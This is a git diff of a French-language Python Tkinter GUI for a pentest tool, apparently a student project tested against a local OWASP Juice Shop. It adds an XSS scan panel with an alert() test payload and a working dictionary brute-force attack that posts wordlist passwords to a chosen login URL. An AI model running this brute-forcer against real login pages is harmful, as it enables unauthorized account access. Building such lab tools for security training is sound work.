@@ -3,13 +3,15 @@ from tkinter import ttk
 import tkinter
 import threading 
 import queue
+import os
 
 import requests
 import xss_scanner
 import dos_attack
 import tkinter.filedialog
 import HashedPassword_Attack
-
+import PIL.Image
+from PIL import Image, ImageTk
 
 class App(Tk):
 	def __init__(self, *args, **kwargs):
@@ -78,13 +80,34 @@ class PageOne(Frame):
 		Frame.__init__(self, parent)
 		self.configure(background='black')
 
-		inputUrl = Entry(self,text = "Lien du site",width=50)
-		inputUrl.pack()
 	
 		label = Label(self, text="Scan des vulnerabilités OWASP")
 		label.pack(padx=10, pady=10)
+
 		frameXSS = LabelFrame(self, text = "Analyse des injections xss")
 		frameXSS.place(x=30,y=30,height=250,width=500)
+
+		labelurlxss = Label(frameXSS, text="Entrez le lien de la page contenant \n un champ de formulaire possiblement vulnérable")
+		labelurlxss.pack()
+
+		inputUrl = Entry(frameXSS,width=50)
+		inputUrl.pack()
+
+		
+		def onClick():
+			labelStartSCan = Label(frameXSS, text="Scan  en cours... ")
+			labelStartSCan.pack()
+			if xss_scanner.scan_xss(inputUrl.get()):
+				labelStartSCan.config(text = "Faille XSS non permanente trouvé !" + "\n" + "Risque elevé" +"\n" + "Attaque utilisé : "+ "<Script>alert('hi')</script>")
+				labelStartSCan = Label(self, text="Fin du scan !")
+				button.pack(fill=y)
+			else : 
+				labelStartSCan.config(text = "Faille XSS non trouvé , fin du scan...")
+			
+		button = Button(frameXSS, text = "Lancer le scan !", command=onClick, bg = "red" , fg = "white")
+		button.pack()
+
+		
 		
 		frameSQL = LabelFrame(self, text = "Analyse des injections sql")
 		frameSQL.place(x=1700,y=30,height=250,width=500)
@@ -101,12 +124,38 @@ class PageOne(Frame):
 		Label_login_url = Label(frameBruteForceLogin, text = "Entre le lien de l'url de la requête post du login !")
 		Label_login_url.pack()
 
+		
+
+		def show_image(self):
+			window = Toplevel()
+			image = Image.open("Images/Explanation_dico_attack.png")
+			photo = ImageTk.PhotoImage(image)
+			label = Label(window, image=photo)
+			label.pack()
+			window.mainloop()
+
+		
+		label_explanation = Label(frameBruteForceLogin, text="Cliquez pour voir où se trouve le lien de la requête post",foreground="blue", font=("Arial", 14, "underline"))
+		label_explanation.bind("<Button-1>",show_image)
+		label_explanation.pack()
+
 		login_url = StringVar()
 		login_entry = ttk.Entry(frameBruteForceLogin, textvariable=login_url)
 		login_entry.pack(fill=X)
 
 
+
+
+		
+		
 		#Specifier le mail/username
+
+		Label_login = Label(frameBruteForceLogin, text = "Ecriver en toutes lettre si c'est un mail ou username")
+		Label_login.pack()
+
+		login= StringVar()
+		username= ttk.Entry(frameBruteForceLogin, textvariable=login)
+		username.pack()
 
 		Label_login_username = Label(frameBruteForceLogin, text = "Entre le mail/username connu")
 		Label_login_username.pack()
@@ -120,38 +169,44 @@ class PageOne(Frame):
 		Label_choose_dico = Label(frameBruteForceLogin, text = "Choisis le dictionnaire !")
 		Label_choose_dico.pack()
 
-		dictionary_choices = ["top 100 pwd", "rockYou", "LeakedPwd2022"]
-		choicesvar = StringVar(value=dictionary_choices)
-		l_dico = Listbox(frameBruteForceLogin, listvariable=choicesvar)
-		l_dico.pack()
+	
+	
+		elements = os.listdir("./Dictionaries")
 
-		#Donner la possibilité à l'user d'ajouter un dico 
+		choicesvar = StringVar(value=elements)
+		l_dicos = Listbox(frameBruteForceLogin, listvariable=choicesvar, exportselection=False)
+		l_dicos.pack(fill =Y)
+			
 
-		def open_file():
-			f_types = [('*.txt')]
-			file_path = tkinter.filedialog.askopenfilename()
-			with open(file_path, 'r') as f:
-				contents = f.read()
-				print(contents)
 
-# Create a button that will trigger the file dialog when clicked
-		button_add_dico = Button(frameBruteForceLogin,text="Open File", command=open_file)
-		button_add_dico.pack()
+		
+		#login_url = "http://localhost:3000/rest/user/login"
+		#login_username = "admin@juice-sh.op"
 
 		#Implémentation du boutton pour lancer l'attaque par dictionaire
 
 		def dico_attack():
+			global file_path
+			j= l_dicos.curselection()
+			if not "file_path" in locals() or l_dicos.get(j) != file_path[13:len(file_path)-4]:
+				if l_dicos.get(j) != "Custom...":
+					file_path=l_dicos.get(j)
+					file_path="./Dictionaries/"+file_path
+			print(file_path)
 			Label_password_found.configure(text ='Recherche du mdp en cours')
-
-			data_null = {'email':'email', 'password':'password'}
+			
+			
+			data_null = {login.get():'email', 'password':'password'}
+			print(login_url.get)
 			response_null = requests.post(login_url.get(),data =data_null)
 			len_null = len(response_null.text)
-
-			with open('Dictionaries/default-passwords.txt','r') as f:
+			
+			with open(file_path,'r') as f:
 				for word in f.readlines():
 					password = word.replace("\n","")
+					print("password tried :", password)
 
-					data = {'email':login_username.get(), 'password':password}
+					data = {login.get():login_username.get(), 'password':password}
 					response = requests.post(login_url.get(),data = data)
 					if len_null != len(response.text):
 						Label_password_found.configure(text ='MDP TROUVE !!!: ' + password)
@@ -163,22 +218,6 @@ class PageOne(Frame):
 		
 		button_launch_dico_attack = Button(frameBruteForceLogin,text="Lancer l'attaque", command=dico_attack)
 		button_launch_dico_attack.pack()
-
-
-		labelXSS = Label(frameXSS, text = "les resultats des failles xss apparaissent ici...")
-		labelXSS.pack()
-		
-		def onClick():
-			labelStartSCan = Label(self, text="Lancement du scan  en cours... ")
-			labelStartSCan.pack()
-			if xss_scanner.scan_xss(inputUrl.get()):
-				labelXSS.config(text = "Faille XSS non permanente trouvé !" + "\n" + "Risque elevé" +"\n" + "Attaque utilisé : "+ "<Script>alert('hi')</script>")
-				labelStartSCan = Label(self, text="Fin du scan !")
-				button.pack(fill=y)
-
-
-		button = Button(self, text = "Lancer le scan !", command=onClick, bg = "red" , fg = "white")
-		button.pack()
 
 		start_page = Button(self, text="Start Page", command=lambda:controller.show_frame(StartPage))
 		start_page.pack()
